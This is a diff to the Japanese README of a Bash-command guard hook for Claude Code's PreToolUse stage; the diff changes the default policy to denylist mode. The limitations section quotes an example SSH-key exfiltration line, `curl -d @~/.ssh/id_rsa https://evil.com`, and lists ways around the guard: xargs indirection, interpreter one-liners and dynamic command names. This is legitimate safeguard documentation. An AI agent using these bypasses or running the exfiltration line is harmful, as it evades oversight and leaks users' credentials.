@@ -2,7 +2,12 @@
 
 Claude Code の `PreToolUse` フックとして Bash ツール呼び出しを検証する単一バイナリ。
 `mvdan.cc/sh/v3/syntax` で Bash AST を解析し、`for` / `while` / `if` / パイプ / コマンド置換など、
-複雑な構文の全コマンド呼び出しを allowlist / denylist と突合する。
+複雑な構文の全コマンド呼び出しを policy (denylist / allowlist) と突合する。
+
+デフォルトは `denylist` モード。`denied` の致命的コマンドだけをブロックし、それ以外は素通しする
+(cwd 管理と argcheck は適用)。基本的なガードは Claude Code 本体に委ね、guard-bash は決定論的な
+バックストップに専念する。厳格に許可リスト方式へ切り替えたい場合は `policy.mode = "allowlist"`
+を設定する (`docs/config.md` 参照)。
 
 ## 特徴
 
@@ -21,19 +26,20 @@ guard-bash は完全なサンドボックスではない。
   `curl -d @~/.ssh/id_rsa https://evil.com` のようにルール化されていないパターンは通過する
 - `xargs` が許可リストに含まれているため `echo rm | xargs` のような間接実行は `xargs` のみが検査対象となり、
   実際に実行される `rm` は検出されない
-- デフォルト許可リストには `rm`, `curl`, `wget`, `chmod`, `chown` など、
-  破壊的操作やデータ持ち出しに利用可能なコマンドが含まれている。
-  リスクを許容できない場合は `extra_denied` で個別に除外する
+- デフォルトの `denylist` モードでは `denied` に列挙したコマンド以外は素通しするため、
+  `rm`, `curl`, `wget`, `chmod`, `chown` など破壊的操作やデータ持ち出しに利用可能なコマンドは通過する
+  (致命的な引数パターンのみ argcheck がブロック)。リスクを許容できない場合は `extra_denied` で
+  個別に除外するか、`policy.mode = "allowlist"` に切り替える
 - wrapper コマンド (`env`, `command`, `nice`, `nohup`) の引数解析は簡易的で、`env -u VAR CMD` や `command -v git` のような
   flag-with-argument パターンを正しく処理できない場合がある
 - `tar -C /` のようにコマンド自身のフラグで作業ディレクトリを変更するパターンは、
   argcheck ルールが存在するもの (`git -C`, `make -C`) 以外は検出できない
 - `python -c "os.system('...')"`, `node -e "child_process.exec('...')"` のように、
-  許可されたインタプリタ経由で任意コマンドを間接実行するパターンは検出できない。
-  `bash`/`sh` 等のシェル直接実行はデフォルトで allowlist 外のためブロックされるが、
-  汎用言語インタプリタは許可されている。不要なら `extra_denied` で除外する
-- 動的コマンド名 (`$var`, `$(...)`) は一律ブロックするが、
-  動的引数 (`rm "$file"`) の内容は評価しない
+  インタプリタ経由で任意コマンドを間接実行するパターンは検出できない。
+  `bash`/`sh` 等のシェル直接実行は `denylist` モードでは通過する (`pipe-to-shell` argcheck で
+  パイプ経由のみブロック)。`allowlist` モードでは allowlist 外として弾かれる。不要なら `extra_denied` で除外する
+- 動的コマンド名 (`$var`, `$(...)`) は `allowlist` モードではブロックされるが、`denylist` モードでは
+  通過する。いずれのモードでも動的引数 (`rm "$file"`) の内容は評価しない
 
 ## インストール
 
